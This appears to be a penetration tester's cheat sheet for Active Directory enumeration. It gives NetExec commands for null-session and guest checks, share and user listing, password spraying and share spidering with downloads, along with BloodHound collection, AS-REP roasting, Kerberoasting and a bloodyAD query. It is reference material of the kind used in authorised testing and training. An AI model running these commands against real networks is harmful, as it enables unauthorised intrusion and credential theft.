# AI - Active Directory Enumeration

## ⚡ Recon Checklist
- [ ] **Null Session** -> [[#Basic Discovery]]
- [ ] **Guest User** -> [[#Basic Discovery]]
- [ ] **Shares & Users** -> [[#Basic Discovery]]
- [ ] **Password Spray** -> [[#Basic Discovery]]
- [ ] **BloodHound** -> [[#LDAP & BloodHound]]
- [ ] **Roasting Checks** -> [[#LDAP & BloodHound]]

---

## SMB Enumeration (NetExec)

### Basic Discovery
**Null Session Check**
```blade-bash tab="ops" pane="one"
nxc smb $ip -u '' -p ''
```

**Guest User Check**
```blade-bash tab="ops" pane="one"
nxc smb $ip -u 'guest' -p ''
```

**List Shares**
```blade-bash tab="ops" pane="one"
nxc smb $ip -u $user -p $password --shares
```

**List Users**
```blade-bash tab="ops" pane="one"
nxc smb $ip -u $user -p $password --users
```

**Password Spraying**
*Note: Using `--continue-on-success` to find all valid accounts.*
```blade-bash tab="ops" pane="one"
nxc smb $ip -u users.txt -p $password --continue-on-success
```

### Advanced SMB
**Spider Shares (Spider_Plus)**
*Downloads file list to local JSON.*
```blade-bash tab="ops" pane="one"
nxc smb $ip -u $user -p $password -M spider_plus -o DOWNLOAD_FLAG=True
```

**Check Logged-on Users**
```blade-bash tab="ops" pane="one"
nxc smb $ip -u $user -p $password --loggedon-users
```

---

## LDAP & BloodHound

### BloodHound Collection (NetExec)
*Note: Ensure DNS is configured in `/etc/resolv.conf` if using FQDN.*
```blade-bash tab="ops" pane="one"
nxc ldap $ip -u $user -p $password --bloodhound --collection All
```

### AS-REP Roasting
*Check for users without Kerberos pre-auth.*
```blade-bash tab="ops" pane="one"
nxc ldap $ip -u $user -p $password --asreproast output.txt
```

### Kerberoasting
*Request TGS for service accounts.*
```blade-bash tab="ops" pane="one"
nxc ldap $ip -u $user -p $password --kerberoast output.txt
```

---

## BloodyAD (Python)

### Enumeration
*Get all attributes for a specific user object.*
```blade-bash tab="ops" pane="one"
python bloodyAD.py --host $ip -u $user -p $password -d $domain get object '$target_user'
```